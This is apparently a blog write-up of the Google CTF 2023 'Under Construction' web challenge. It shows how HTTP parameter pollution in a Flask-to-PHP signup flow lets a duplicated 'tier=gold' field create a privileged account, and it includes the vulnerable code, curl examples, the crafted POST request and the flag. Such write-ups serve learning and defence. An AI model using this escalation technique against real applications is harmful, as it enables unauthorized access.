---
title: Google CTF 2023 Under Construction (Web) Writeup
tags:
  - ctf
  - writeups
  - google-ctf-2023
categories:
  - CTF Writeups
summary: Writeup for under construction challenge from google ctf 2023
created: 2023-06-27
lastmod: 2023-06-27
image: https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7 
---
# Introduction
This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: _"We were building a web app but the new CEO wants it remade in php."_ The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an `Parameter Pollution` vulnerability we were able to create an escalated user by supplying more than 1 parameter. 

# Writeup
So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. 

Reading the code, i got to the `flag` point. In the `index.php` file, we have: 
```php
...
if ($tier === NULL) {
    return "Invalid credentials";
}

$response = "Login successful. Welcome " . htmlspecialchars($username) . ".";

// Look at this part. 
if ($tier === "gold") {
    $response .= " " . getenv("FLAG");
}

return $response;

...
```

So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn't offer any signup functionlaity but the `account_migrator.php` file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. 

In the `authorized_routes.py`, we have: 
```python
...
@authorized.route('/signup', methods=['POST'])
def signup_post():
  ...
  tier = models.Tier(request.form.get('tier'))

  if(tier == models.Tier.GOLD):
      flash('GOLD tier only allowed for the CEO')
      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter
  ...

  new_user = models.User(username=username, 
  password=generate_password_hash(password, method='sha256'), tier=tier.name)
  
  db.session.add(new_user)
  db.session.commit()
  
  requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
      headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request) # Vulnerable PART
  return redirect(url_for('authorized.login'))
```

The validation is based on the statement: `request.form.get('tier')`. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the `raw_request` as it is to the next application which is in PHP. 

Take the following example:
```bash
# Flask
curl https://vulnerablepart.com?tier=gold&tier=blue
# you will the first parameter aka gold.

# PHP
curl http://vulnerablepart.com?tier=gold&tier=bold
# you will get the second parameter aka bold
```

So, in order to exploit this, we needed to create the user normally but with extra argument containing `gold` value. I simply signed up with the following request in Burp: 
```javascript
POST /signup HTTP/2
Host: under-construction-web.2023.ctfcompetition.com
Upgrade-Insecure-Requests: 1
Origin: https://under-construction-web.2023.ctfcompetition.com
Content-Type: application/x-www-form-urlencoded
User-Agent: <Redacted>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

username=hash3liZer&password=password&tier=blue&tier=gold
```

And it took me back to login page to signin:

<img width="962" alt="image" src="https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3">

So, i went to the PHP application and logged in and got the flag:

<img width="1440" alt="image" src="https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f">

```
CTF{ff79e2741f21abd77dc48f17bab64c3d}
```
